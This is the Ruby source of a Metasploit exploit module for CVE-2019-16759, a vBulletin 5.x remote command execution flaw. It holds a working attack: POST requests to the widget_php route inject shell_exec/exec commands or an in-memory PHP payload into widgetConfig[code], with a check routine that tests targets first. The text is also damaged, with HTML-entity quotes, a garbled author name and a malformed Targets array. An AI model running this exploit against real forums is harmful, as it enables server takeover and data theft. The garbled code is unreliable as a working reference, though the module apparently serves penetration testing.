# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;vBulletin widgetConfig RCE&#039;,
      &#039;Description&#039; => %q{
        vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code]
        parameter in an ajax/render/widget_php routestring POST request.
      },
      &#039;Author&#039; => [
        &#039;unknown&#039;, # discovered by an unknown sender.
        &#039;mekhalleh (RAMELLA SÃ©bastien)&#039; # this module.
      ],
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2019-16759&#039;],
        [&#039;URL&#039;, &#039;https://seclists.org/fulldisclosure/2019/Sep/31&#039;],
        [&#039;URL&#039;, &#039;https://blog.sucuri.net/2019/09/zero-day-rce-in-vbulletin-v5-0-0-v5-5-4.html&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;2019-09-23&#039;,
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => [&#039;php&#039;, &#039;unix&#039;, &#039;windows&#039;],
      &#039;Arch&#039; => [ARCH_CMD, ARCH_PHP],
      &#039;Privileged&#039; => true,
      &#039;Targets&#039; => [
          &#039;Platform&#039; => &#039;php&#039;,
          &#039;Arch&#039; => [ARCH_PHP],
          &#039;Type&#039; => :php_memory,
          &#039;Payload&#039; => {
            &#039;BadChars&#039; => "\x22",
          },
          &#039;DefaultOptions&#039; => {
            &#039;DisablePayloadHandler&#039; => &#039;false&#039;
          }
        ],
        [&#039;Unix (CMD In-Memory)&#039;,
          &#039;Platform&#039; => &#039;unix&#039;,
          &#039;Arch&#039; => ARCH_CMD,
          &#039;Type&#039; => :unix_cmd,
          &#039;DefaultOptions&#039; => {
            &#039;PAYLOAD&#039; => &#039;cmd/unix/generic&#039;,
            &#039;DisablePayloadHandler&#039; => &#039;true&#039;
          }
        ],
        [&#039;Windows (CMD In-Memory)&#039;,
          &#039;Platform&#039; => &#039;windows&#039;,
          &#039;Arch&#039; => ARCH_CMD,
          &#039;Type&#039; => :windows_cmd,
          &#039;DefaultOptions&#039; => {
            &#039;PAYLOAD&#039; => &#039;cmd/windows/generic&#039;,
            &#039;DisablePayloadHandler&#039; => &#039;true&#039;
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;Notes&#039; => {
        &#039;Stability&#039; => [CRASH_SAFE],
        &#039;Reliability&#039; => [REPEATABLE_SESSION],
        &#039;SideEffects&#039; => [IOC_IN_LOGS]
      }
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vBulletin base path&#039;, &#039;/&#039;]),
      OptEnum.new(&#039;PHP_CMD&#039;, [true, &#039;Specify the PHP function in which you want to execute the payload.&#039;, &#039;shell_exec&#039;, [&#039;shell_exec&#039;, &#039;exec&#039;]])
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ])
  end

  def cmd_payload(command)
    return("echo #{datastore[&#039;PHP_CMD&#039;]}(&#039;#{command}&#039;); exit;")
  end

  def execute_command(command)
    response = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path),
      &#039;encode_params&#039; => true,
      &#039;vars_post&#039; => {
        &#039;routestring&#039; => &#039;ajax/render/widget_php&#039;,
        &#039;widgetConfig[code]&#039; => command
      }
    })
    if (response) && (response.body)
      return response
    end

    return false
  end

  def check
    rand_str = Rex::Text.rand_text_alpha(8)
    received = execute_command(cmd_payload("echo #{rand_str}"))
    if received && received.body.include?(rand_str)
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    unless check.eql? Exploit::CheckCode::Vulnerable
      unless datastore[&#039;ForceExploit&#039;]
        fail_with(Failure::NotVulnerable, &#039;The target is not exploitable.&#039;)
      end
    end
    vprint_good("The target appears to be vulnerable.")

    print_status("Sending #{datastore[&#039;PAYLOAD&#039;]} command payload")
    case target[&#039;Type&#039;]
    when :unix_cmd, :windows_cmd
      cmd = cmd_payload(payload.encoded)
      vprint_status("Generated command payload: #{cmd}")

      received = execute_command(cmd)
      if (received) && (datastore[&#039;PAYLOAD&#039;] == "cmd/#{target[&#039;Platform&#039;]}/generic")
        print_warning(&#039;Dumping command output in body response&#039;)
        if received.body.empty?
          print_error(&#039;Empty response, no command output&#039;)
          return
        end
        print_line("#{received.body}")
      end

    when :php_memory
      vprint_status("Generated command payload: #{payload.encoded}")
      execute_command(payload.encoded)
    end
  end
end

